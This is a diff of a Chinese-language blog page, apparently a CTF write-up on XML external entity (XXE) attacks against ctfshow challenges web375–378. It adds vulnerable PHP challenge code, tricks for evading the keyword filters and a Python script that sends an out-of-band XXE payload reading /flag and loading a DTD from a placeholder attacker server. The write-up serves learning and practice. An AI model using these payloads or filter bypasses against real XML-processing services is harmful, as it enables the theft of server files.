@@ -30,8 +30,12 @@
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-1.png">
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-2.png">
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-3.png">
+<meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/375-1.png">
+<meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378.png">
+<meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378-1.png">
+<meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378-2.png">
 <meta property="article:published_time" content="2024-06-10T04:00:00.000Z">
-<meta property="article:modified_time" content="2024-06-13T12:16:24.098Z">
+<meta property="article:modified_time" content="2024-06-29T05:40:42.234Z">
 <meta property="article:author" content="orange">
 <meta property="article:tag" content="xxe">
 <meta name="twitter:card" content="summary_large_image">
@@ -271,7 +275,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.3k 字
+          2.9k 字
         
       </span>
     
@@ -282,7 +286,7 @@
         
         
         
-          20 分钟
+          25 分钟
         
       </span>
     
@@ -332,7 +336,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年6月13日 晚上
+                    本文最后更新于 2024年6月29日 下午
                   
                 
               </p>
@@ -438,6 +442,39 @@
 <p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-3.png" srcset="/img/loading.gif" lazyload alt="374-3"></p>
 <p>流程:首先在burpsuite的repeated页面构造最上面的payload，利用参数实体，调用%dtds,获得服务器上的test.dtd,再到dtd中的%dtd中的%showflag,这里注意%需要进行实体编码&amp;#x25，把内容带出到我们开的端口上面，最后得到flag。</p>
 <p>ps:我本地没有配置web服务，所以需要开个http服务，如果有配置的话不需要一些步骤，可以参考其他师傅的wp了解一下。</p>
+<h3 id="3-ctfshow-web375"><a href="#3-ctfshow-web375" class="headerlink" title="3.ctfshow web375"></a>3.ctfshow web375</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:22:05<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br><br></code></pre></td></tr></table></figure>
+
+<p>这题和374其实差不多，多了一层验证，判断是否有 ?xml version&#x3D;”1.0”,如果有就会爆error</p>
+<p>和374流程几乎完全一样只是绕过一下，有两种方法</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一:"></a>方法一:</h4><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/375-1.png" srcset="/img/loading.gif" lazyload alt="375-1"></p>
+<p>直接去掉就行，会默认是xml文本</p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h4><p>这里的判断是对整体的判断，中间多加一个空格就可以进行绕过</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml  version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>其他同374进行</p>
+<h3 id="4-ctfshow-web376"><a href="#4-ctfshow-web376" class="headerlink" title="4.ctfshow web376"></a>4.ctfshow web376</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:23:51<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br></code></pre></td></tr></table></figure>
+
+<p>这题比上面多了一层大小写判断，基本没有影响</p>
+<p>就用上面的方法就行</p>
+<p>这里的双引号也可以用单引号进行绕过，不多赘叙</p>
+<h3 id="5-ctfshow-web377"><a href="#5-ctfshow-web377" class="headerlink" title="5.ctfshow web377"></a>5.ctfshow web377</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:26:55<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br><br></code></pre></td></tr></table></figure>
+
+<p>这题比上层多了http的绕过，这题看了师傅的绕法</p>
+<p>正常使用的是utf-8，我们可以编码为utf-16或者utf-32来进行python发包</p>
+<p>直接上payload，这些题目基本是一样的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&#x27;http://0197db2a-c2a9-49f9-8823-3868d3a6ae77.challenge.ctf.show/&#x27;</span><br>payload=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE hacker[    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="hljs-string">    &lt;!ENTITY % dtds SYSTEM &quot;http://vps:8888/test.dtd&quot;&gt;</span><br><span class="hljs-string">    %dtds;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;</span><br><span class="hljs-string">1</span><br><span class="hljs-string">&lt;/root&gt;&quot;&quot;&quot;</span><br>payload=payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br><span class="hljs-built_in">print</span>(requests.post(url,data=payload).text)<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-ctfshow-web378"><a href="#6-ctfshow-web378" class="headerlink" title="6.ctfshow web378"></a>6.ctfshow web378</h3><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378.png" srcset="/img/loading.gif" lazyload alt="378"></p>
+<p>f12看看源码定位到了一行</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">contentType:</span> <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>那就是xxe无回显的题目了</p>
+<p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378-1.png" srcset="/img/loading.gif" lazyload alt="378-1"></p>
+<p>简单分析一下，url&#x2F;doLogin下面进行xxe利用，得到flag,构造username和password</p>
+<p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378-2.png" srcset="/img/loading.gif" lazyload alt="378-2"></p>
+<p>得到flag</p>
+<p>还有的例题可以参照我的litctf2024和polarctf2024夏，分别有道考察xxe方面的题目</p>
+<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>以上是我对xxe的浅层次的学习，虽然题目都不算太难，但也算能入个门了，暂时就到这了。</p>
 
                 
               </div>
